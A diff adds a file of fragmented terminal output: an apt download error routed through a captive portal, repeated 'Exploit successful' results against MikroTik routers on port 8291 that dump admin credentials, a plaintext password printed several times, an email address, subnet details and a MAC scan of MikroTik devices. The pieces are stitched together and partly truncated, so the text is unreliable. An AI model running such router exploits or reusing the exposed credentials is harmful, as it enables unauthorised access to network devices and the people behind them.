@@ -1,0 +1,86 @@
+: فشل إحضار http://www.zidnet.net/login?dst=http://mirror-1.truenetwork.ru/kali/pool/main/v/vim/xxd_8.1.2269-1%2bb1_i386.deb  File has unexpected size (9628 != 140712). Mirror sync in progress? [IP: 10.0.0.1 80]
+   Hashes of expected file:
+    - SHA256:336d94ccd7424b7dbd2b7e219da356b4dd5e7b016867e4dcc95fd1dfbebfde13
+    - SHA1:518f6136243539066f804a98bd14f261b56d9620 [weak]
+    - MD5Sum:0d2af091ce3344190d9c8f44188325ae [weak]
+    - Filesize:140712 [weak]
+
+
+
+
+
+
+Connected to 192.168.88.1:8291
+Exploit successful
+User: admin
+Pass: 
+
+User: admin                                 [+]  Enter IP/HOST : zid.net 
+Address       = 91.195.240.126
+Network       = 91.195.240.126 / 32
+Netmask       = 255.255.255.255
+Broadcast     = not needed on Point-to-Point links
+Wildcard Mask = 0.0.0.0
+Hosts Bits    = 0
+Max. Hosts    = 1   (2^0 - 0)
+Host Range    = { 91.195.240.126 - 91.195.240.126 }
+
+Pass: 
+
+
+
+
+User: admin
+Pass: zaidzid246243
+http://192.168.88.1:8291/userman
+tool user-manager customer pr
+admin@zid.net
+91.195.240.126
+
+Connected to 192.168.14.5:8291
+Exploit successful
+User: admin
+Pass: 
+
+User: admin
+Pass: 
+
+User: admin
+Pass: zaidzid246243
+onnected to 192.168.13.5:8291
+Exploit successful
+User: admin
+
+
+
+
+
+
+Pass: 
+
+User: admin
+Pass: 
+
+User: admin
+Pass: zaidzid246243
+
+http://192.168.88.1:8291/userman
+
+Looking for Mikrotik devices (MAC servers)
+6C:3B:6B:C4:E1:3E                             192.168.88.2-192.168.88.254
+6C:3B:6B:BB:4A:42          E4:8D:8C:25:35:D0   00:00:00:00:00:00
+6C:3B:6B:BB:4A:42
+6C:3B:6B:C4:E1:34
+E4:8D:8C:25:35:D7
+E4:8D:8C:1E:DD:69
+E4:8D:8C:1E:DD:64
+E4:8D:8C:1E:DD:65
+E4:8D:8C:1E:DD:66
+E4:8D:8C:1E:DD:67
+E4:8D:8C:1E:DD:6A
+E4:8D:8C:1E:DD:68
+E4:8D:8C:1E:DD:6B
+E4:8D:8C:1E:DD:6C
+E4:8D:8C:1E:DD:6D
+E4:8D:8C:1E:DD:63
+E4:8D:8C:1E:DD:64
